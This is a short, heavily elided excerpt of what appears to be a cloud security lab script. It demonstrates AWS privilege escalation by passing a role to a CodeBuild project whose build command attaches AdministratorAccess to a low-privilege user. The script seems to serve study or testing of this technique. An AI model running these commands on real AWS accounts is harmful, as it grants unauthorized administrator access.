...
# Configuration
STARTING_USER="pl-prod-cbcpsbb-to-admin-starting-user"
TARGET_ROLE="pl-prod-cbcpsbb-to-admin-target-role"
...
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_passrole_codebuild_createproject_codebuild_startbuildbatch.value // empty')
        ...
        phases:
          build:
            commands:
              ...
              - aws iam attach-user-policy --user-name pl-prod-cbcpsbb-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
...
# Step 7: Start the build batch to execute the privilege escalation
...
# Step 8: Wait for the build batch to complete and policy to propagate
